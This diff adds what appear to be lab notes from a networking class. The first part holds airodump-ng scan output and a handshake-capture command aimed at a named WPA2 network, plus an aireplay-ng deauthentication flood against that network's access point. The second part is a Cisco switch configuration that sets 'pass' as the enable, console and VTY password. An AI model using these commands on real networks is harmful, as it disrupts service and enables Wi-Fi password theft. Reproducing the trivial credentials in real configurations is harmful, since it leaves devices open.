@@ -1,0 +1,52 @@
+50:D4:F7:6D:CB:96  -59      110       72    0   2  270   WPA2 CCMP   PSK  RIVAN 3RD FLOOR
+
+50:D4:F7:6D:CB:96  -59      110       72    0   2
+
+
+airodump-ng -w chris42 -c 2 --bssid 50:D4:F7:6D:CB:96 wlan1
+-----Second window Kali
+aireplay-ng --deauth 0 -a 50:D4:F7:6D:CB:96 wlan1
+
+
+28:EE:52:94:9C:C7  -65        5        0    0   7  130   WPA2 CCMP   PSK  Rivan_5th_Flr
+28:EE:52:94:9C:C7  -65        5        0    0   7
+
+
+
+28:EE:52:94:9C:C7  -64        1        1    0   7  130   WPA2 CCMP   PSK  Rivan_5th_Flr
+28:EE:52:94:9C:C7  -64        1        1    0   7
+
+config t
+   hostname COREbaba42
+   enable secret pass
+   service password-encryption
+   no logging console
+   no ip domain-lookup
+   line console 0
+     password pass
+     login
+     exec-timeout 0 0
+    line vty 0 14
+      password pass
+      login
+      exec-timeout 0 0
+   Int Gi 0/1
+     no shutdown
+	  no switchport
+	  ip add 10.42.42.2 255.255.255.0
+   Int Vlan 1
+     no shutdown
+	 ip add 10.42.1.2 255.255.255.0
+	 description MGMTDATA
+   Int Vlan 10
+     no shutdown
+	 ip add 10.42.10.2 255.255.255.0
+	 description WIRELESS
+   Int Vlan 50
+     no shutdown
+	 ip add 10.42.50.2 255.255.255.0
+	 description IPCCTV
+   Int Vlan 100
+     no shutdown
+	 ip add 10.42.100.2 255.255.255.0
+	 description VOICEVLAN
